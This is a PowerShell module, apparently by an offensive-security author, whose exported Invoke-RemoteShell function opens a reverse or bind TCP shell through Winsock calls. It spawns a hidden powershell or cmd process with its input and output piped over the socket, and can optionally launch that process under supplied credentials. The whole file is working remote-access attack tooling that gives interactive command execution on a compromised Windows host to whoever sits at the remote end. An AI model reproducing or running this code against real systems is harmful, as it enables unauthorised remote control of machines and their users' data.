# ----------------------------------------------------------------------------------- #
#                                                                                     #
#    .Developer                                                                       #
#        Jean-Pierre LESUEUR (@DarkCoderSc)                                           #
#        https://www.twitter.com/darkcodersc                                          #
#        https://github.com/PhrozenIO                                                 #
#        https://github.com/DarkCoderSc                                               #
#        www.phrozen.io                                                               #
#        jplesueur@phrozen.io                                                         #
#        PHROZEN                                                                      #
#                                                                                     #
#    .Disclaimer                                                                      #
#        This script is provided "as is", without warranty of any kind, express or    #
#        implied, including but not limited to the warranties of merchantability,     #
#        fitness for a particular purpose and noninfringement. In no event shall the  #
#        authors or copyright holders be liable for any claim, damages or other       #
#        liability, whether in an action of contract, tort or otherwise, arising      #
#        from, out of or in connection with the software or the use or other dealings #
#        in the software.                                                             #
#                                                                                     #
# ----------------------------------------------------------------------------------- #

# ----------------------------------------------------------------------------------- #
#                           - STRUCTURES MEMORY MAPS -                                #
# ----------------------------------------------------------------------------------- #
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
# ----------------------------------------------------------------------------------- #
# Field               | Type       | Size x32 | Offset x32 | Size x64 | Offset x64    #
# ----------------------------------------------------------------------------------- #
# PROCESS_INFORMATION                                                                 #
# ----------------------------------------------------------------------------------- #
# hProcess            | HANDLE     | 0x4      | 0x0        | 0x8      | 0x0           #
# hThread             | HANDLE     | 0x4      | 0x4        | 0x8      | 0x8           #
# dwProcessId         | DWORD      | 0x4      | 0x8        | 0x4      | 0x10          #
# dwThreadId          | DWORD      | 0x4      | 0xC        | 0x4      | 0x14          #
# ----------------------------------------------------------------------------------- #
# Total Size x32: 0x10 (16 Bytes)      |     Total Size x64: 0x18 (24 Bytes)          #
# ----------------------------------------------------------------------------------- #
# STARTUPINFOW                                                                        #
# ----------------------------------------------------------------------------------- #
# cb                  | DWORD      | 0x4      | 0x0        | 0x4      | 0x0           #
# lpReserved          | LPWSTR     | 0x4      | 0x4        | 0x8      | 0x8           #
# lpDesktop           | LPWSTR     | 0x4      | 0x8        | 0x8      | 0x10          #
# lpTitle             | LPWSTR     | 0x4      | 0xC        | 0x8      | 0x18          #
# dwX                 | DWORD      | 0x4      | 0x10       | 0x4      | 0x20          #
# dwY                 | DWORD      | 0x4      | 0x14       | 0x4      | 0x24          #
# dwXSize             | DWORD      | 0x4      | 0x18       | 0x4      | 0x28          #
# dwYSize             | DWORD      | 0x4      | 0x1C       | 0x4      | 0x2C          #
# dwXCountChars       | DWORD      | 0x4      | 0x20       | 0x4      | 0x30          #
# dwYCountChars       | DWORD      | 0x4      | 0x24       | 0x4      | 0x34          #
# dwFillAttribute     | DWORD      | 0x4      | 0x28       | 0x4      | 0x38          #
# dwFlags             | DWORD      | 0x4      | 0x2C       | 0x4      | 0x3C          #
# wShowWindow         | WORD       | 0x2      | 0x30       | 0x2      | 0x40          #
# cbReserved2         | WORD       | 0x2      | 0x32       | 0x2      | 0x42          #
# lpReserved2         | LPBYTE     | 0x4      | 0x34       | 0x8      | 0x48          #
# hStdInput           | HANDLE     | 0x4      | 0x38       | 0x8      | 0x50          #
# hStdOutput          | HANDLE     | 0x4      | 0x3C       | 0x8      | 0x58          #
# hStdError           | HANDLE     | 0x4      | 0x40       | 0x8      | 0x60          #
# ----------------------------------------------------------------------------------- #
# Total Size x32: 0x44 (68 Bytes)      |     Total Size x64: 0x68 (104 Bytes)         #
# ----------------------------------------------------------------------------------- #

# ----------------------------------------------------------------------------------- #
#                                                                                     #
#                                                                                     #
#                                                                                     #
#  Windows API Definitions                                                            #
#                                                                                     #
#                                                                                     #
#                                                                                     #
# ----------------------------------------------------------------------------------- #

Add-Type @"
    using System;
    using System.Text;
    using System.Security;
    using System.Runtime.InteropServices;

    public static class WS232
    {
        [DllImport("Ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int WSAStartup(
            ushort wVersionRequested,
            IntPtr lpWSAData
        );

        [DllImport("Ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int WSACleanup();

        [DllImport("ws2_32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr WSASocket(
            int af,
            int type,
            int protocol,
            IntPtr lpProtocolInfo,
            int g,
            int dwFlags
        );

        [DllImport("ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int WSAConnect(
            IntPtr s,
            IntPtr name,
            int namelen,
            IntPtr lpCallerData,
            IntPtr lpCalleeData,
            IntPtr lpSQOS,
            IntPtr lpGQOS
        );

        [DllImport("ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int bind(
            IntPtr s,
            IntPtr name,
            int namelen
        );

        [DllImport("ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int listen(
            IntPtr s,
            int backlog
        );

        [DllImport("ws2_32.dll", SetLastError = true)]
        public static extern IntPtr WSAAccept(
            IntPtr s,
            IntPtr addr,
            IntPtr addrlen,
            IntPtr lpfnCondition,
            IntPtr dwCallbackData
        );

        [DllImport("ws2_32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int closesocket(IntPtr s);
    }

    public static class ADVAPI32
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet=CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessWithLogonW(
            string lpUsername,
            string lpDomain,
            string lpPassword,
            uint dwLogonFlags,
            IntPtr lpApplicationName,
            string lpCommandLine,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDirectory,
            IntPtr lpStartupInfo,
            IntPtr lpProcessInformation
        );
    }

    public static class Kernel32
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessW(
            IntPtr lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDirectory,
            IntPtr lpStartupInfo,
            IntPtr lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.U4)]
        public static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.I4)]
        public static extern int FormatMessage(
            uint dwFlags,
            IntPtr lpSource,
            uint dwMessageId,
            uint dwLanguageId,
            StringBuilder msgOut,
            uint nSize,
            IntPtr Arguments
        );
    }
"@

# ----------------------------------------------------------------------------- #
#                                                                               #
#                                                                               #
#                                                                               #
#  Local Classes                                                                #
#                                                                               #
#                                                                               #
#                                                                               #
# ----------------------------------------------------------------------------- #

class WinAPIException: System.Exception
{
    WinAPIException([string] $ApiName) : base (
        [string]::Format(
            "WinApi Exception -> {0}, Message: ""{1}""",
            $ApiName,
            (Invoke-GetLastWin32ErrorMessage -ErrorCode ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()))
        )
    )
    {}
}

# -------------------------------------------------------------------------------

class ValidateShellKindAttribute : System.Management.Automation.ValidateArgumentsAttribute {
    [void] Validate([object]$arguments, [System.Management.Automation.EngineIntrinsics]$engineIntrinsics)
    {
        if (-not ($arguments.ToLower() -in @("powershell", "cmd", "comspec"))) {
            throw "Possible shell options include: 'PowerShell', 'cmd', or 'COMSPEC'. 'COMSPEC' " +
                  "refers to the default shell specified by the environment variable of the same name."
        }
    }
}

# ----------------------------------------------------------------------------- #
#                                                                               #
#                                                                               #
#                                                                               #
#  Local Functions                                                              #
#                                                                               #
#                                                                               #
#                                                                               #
# ----------------------------------------------------------------------------- #

function Invoke-GetLastWin32ErrorMessage()
{
    param(
        [Parameter(Mandatory=$True)]
        [int] $ErrorCode
    )

    $sBuilder = New-Object System.Text.StringBuilder(1024)

    $FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
    $FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200

    $result = [Kernel32]::FormatMessage(
        $FORMAT_MESSAGE_FROM_SYSTEM -bor $FORMAT_MESSAGE_IGNORE_INSERTS,
        [IntPtr]::Zero,
        $ErrorCode,
        0,
        $sBuilder,
        $sBuilder.Capacity,
        [IntPtr]::Zero
    )

    if ($result -ne 0)
    {
        return [string]::Format("(ErrorCode: {0}): {1}", $ErrorCode, $sBuilder.ToString().Trim())
    }
    else
    {
        return [string]::Format("ErrorCode: {0}", $ErrorCode)
    }
}

# -------------------------------------------------------------------------------

function Invoke-ZeroMemory
{
    param(
        [IntPtr] $MemoryOffset,
        [int] $Size
    )

    for ($i = 0; $i -lt $Size; $i++)
    {
        [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryOffset, $i, 0x0)
    }
}

# -------------------------------------------------------------------------------

function Invoke-CreateProcess
{
    param (
        [Parameter(Mandatory=$True)]
        [int] $Socket,

        [string] $Username = "",
        [string] $Password = "",
        [string] $Domain = "",

        [ValidateShellKind()]
        [string] $ShellKind = "powershell"
    )

    if ([Environment]::Is64BitProcess)
    {
        # STARTUP_INFO x64
        $STARTUPINFO_structSize = 0x68
        $STARTUPINFO_dwFlags = 0x3c
        $STARTUPINFO_wShowWindow = 0x40
        $STARTUPINFO_StdInput = 0x50
        $STARTUPINFO_StdOutput = 0x58
        $STARTUPINFO_StdError = 0x60

        # PROCESS_INFORMATION x64
        $PROCESS_INFORMATION_structSize = 0x18
        $PROCESS_INFORMATION_hThread = 0x8
    }
    else
    {
        # STARTUP_INFO x32
        $STARTUPINFO_structSize = 0x44
        $STARTUPINFO_dwFlags = 0x2c
        $STARTUPINFO_wShowWindow = 0x30
        $STARTUPINFO_StdInput = 0x38
        $STARTUPINFO_StdOutput = 0x3c
        $STARTUPINFO_StdError = 0x40

        # PROCESS_INFORMATION x32
        $PROCESS_INFORMATION_structSize = 0x10
        $PROCESS_INFORMATION_hThread = 0x4
    }

    $pSTARTUPINFO = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($STARTUPINFO_structSize)
    $pPROCESS_INFORMATION = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PROCESS_INFORMATION_structSize)
    try
    {
        Invoke-ZeroMemory -MemoryOffset $pSTARTUPINFO -Size $STARTUPINFO_structSize
        Invoke-ZeroMemory -MemoryOffset $pPROCESS_INFORMATION -Size $PROCESS_INFORMATION_structSize

        # STARTUPINFO Structure Initialization
        [System.Runtime.InteropServices.Marshal]::WriteInt32(
            $pSTARTUPINFO,
            0x0,
            $STARTUPINFO_structSize
        )

        $STARTF_USESHOWWINDOW = 0x1
        $dwFlags = $STARTF_USESHOWWINDOW

        $STARTF_USESTDHANDLES = 0x100
        $dwFlags = $dwFlags -bor $STARTF_USESTDHANDLES

        [System.Runtime.InteropServices.Marshal]::WriteInt32(
            $pSTARTUPINFO,
            $STARTUPINFO_dwFlags,
            $dwFlags
        )

        $SW_HIDE = 0x0
        [System.Runtime.InteropServices.Marshal]::WriteInt16(
            $pSTARTUPINFO,
            $STARTUPINFO_wShowWindow,
            $SW_HIDE
        )

        # Redirect Standard I/O
        [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
            $pSTARTUPINFO,
            $STARTUPINFO_StdInput,
            $Socket
        )

        [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
            $pSTARTUPINFO,
            $STARTUPINFO_StdOutput,
            $Socket
        )

        [System.Runtime.InteropServices.Marshal]::WriteIntPtr(
            $pSTARTUPINFO,
            $STARTUPINFO_StdError,
            $Socket
        )

        $CommandLine = [Environment]::GetEnvironmentVariable("COMSPEC")
        switch ($ShellKind.ToLower())
        {
            "powershell"
            {
                $CommandLine = "powershell.exe"
            }

            "cmd"
            {
                $CommandLine = "cmd.exe"
            }
        }

        # TODO: Break Job
        if ([string]::IsNullOrWhiteSpace($Username))
        {
            if (-not [Kernel32]::CreateProcessW(
                [IntPtr]::Zero,
                $CommandLine,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                $true,
                0,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                $pSTARTUPINFO,
                $pPROCESS_INFORMATION
            ))
            {
                throw [WinAPIException]::New("CreateProcessW")
            }
        }
        else
        {
            if (-not [ADVAPI32]::CreateProcessWithLogonW(
                $Username,
                $Domain,
                $Password,
                0,
                [IntPtr]::Zero,
                $CommandLine,
                0,
                [IntPtr]::Zero,
                [IntPtr]::Zero,
                $pSTARTUPINFO,
                $pPROCESS_INFORMATION
            ))
            {
                throw [WinAPIException]::New("CreateProcessWithLogonW")
            }
        }

        $hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr(
            $pPROCESS_INFORMATION,
            0x0
        )

        $hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr(
            $pPROCESS_INFORMATION,
            $PROCESS_INFORMATION_hThread
        )

        $null = [Kernel32]::WaitForSingleObject($hProcess, [UInt32]::MaxValue)

        $null = [Kernel32]::CloseHandle($hThread)
        $null = [Kernel32]::CloseHandle($hProcess)
    }
    finally
    {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pSTARTUPINFO)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pPROCESS_INFORMATION)
    }
}

# ----------------------------------------------------------------------------- #
#                                                                               #
#                                                                               #
#                                                                               #
#  Exported Function(s)                                                         #
#                                                                               #
#                                                                               #
#                                                                               #
# ----------------------------------------------------------------------------- #

function Invoke-RemoteShell
{
    param(
        [Parameter(Mandatory=$True)]
        [string] $Address,

        [Parameter(Mandatory=$True)]
        [ValidateRange(1, 65535)]
        [int] $Port,

        [Parameter(Mandatory=$True)]
        [ValidateSet("Reverse", "Bind")]
        [string] $Mode,

        [string] $Username = "",
        [string] $Password = "",
        [string] $Domain = "",

        [ValidateShellKind()]
        [string] $ShellKind = "powershell"
    )

    $WSAData = [IntPtr]::Zero
    $socket = [IntPtr]::Zero
    $sockAddrPtr = [IntPtr]::Zero
    try
    {
        $SOCKET_ERROR = -1

        $WSAData = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(408)
        if ([WS232]::WSAStartup(0x2020, $WSAData))
        {
            throw [WinAPIException]::New("WSAStartup")
        }

        $AF_INET = 2
        $SOCK_STREAM = 1
        $IPPROTO_TCP = 6

        $socket = [WS232]::WSASocket($AF_INET, $SOCK_STREAM, $IPPROTO_TCP, [IntPtr]::Zero, 0, 0)
        if ($socket -eq [IntPtr]::Zero)
        {
            throw [WinAPIException]::New("WSASocket")
        }

        $ipEndPoint = [System.Net.IPEndPoint]::New(
            [System.Net.IPAddress]::Parse($Address),
            $Port
        )

        $sockAddr = $ipEndPoint.Serialize()

        $sockAddrPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sockAddr.Size)

        for ($i = 0; $i -lt $sockAddr.Size; $i++) {
            [System.Runtime.InteropServices.Marshal]::WriteByte($sockAddrPtr, $i, $sockAddr[$i])
        }

        $client = [IntPtr]::Zero;

        Switch ($Mode)
        {
            "Reverse" {
                $result = [WS232]::WSAConnect(
                    $socket,
                    $sockAddrPtr,
                    $sockAddr.Size,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero
                )
                if ($result -eq $SOCKET_ERROR)
                {
                    throw [WinAPIException]::New("WSAConnect")
                }

                $client = $socket
                $socket = [IntPtr]::Zero
            }

            "Bind" {
                $result = [WS232]::bind(
                    $socket,
                    $sockAddrPtr,
                    $sockAddr.Size
                )

                if ($result -eq $SOCKET_ERROR)
                {
                    throw [WinAPIException]::New("bind")
                }

                $result = [WS232]::listen(
                    $socket,
                    1
                )

                if ($result -eq $SOCKET_ERROR)
                {
                    throw [WinAPIException]::New("listen")
                }

                $client = [WS232]::WSAAccept(
                    $socket,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero,
                    [IntPtr]::Zero
                )

                if ($client -eq [IntPtr]::Zero)
                {
                    break
                }
            }
        }

        if ($client -ne [IntPtr]::Zero)
        {
            Invoke-CreateProcess -Socket $client -Username $Username -Password $Password -Domain $Domain -ShellKind $ShellKind

            $null = [WS232]::closesocket($client)
        }
    }
    finally
    {
        if ($sockAddrPtr -ne [IntPtr]::Zero)
        {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($sockAddrPtr)
        }

        if ($socket -ne [IntPtr]::Zero)
        {
            $null = [WS232]::closesocket($socket)
        }

        if ($WSAData -ne [IntPtr]::Zero)
        {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WSAData)
        }

        $null = [WS232]::WSACleanup()
    }
}

# -------------------------------------------------------------------------------

try {
    Export-ModuleMember -Function Invoke-RemoteShell
} catch {}
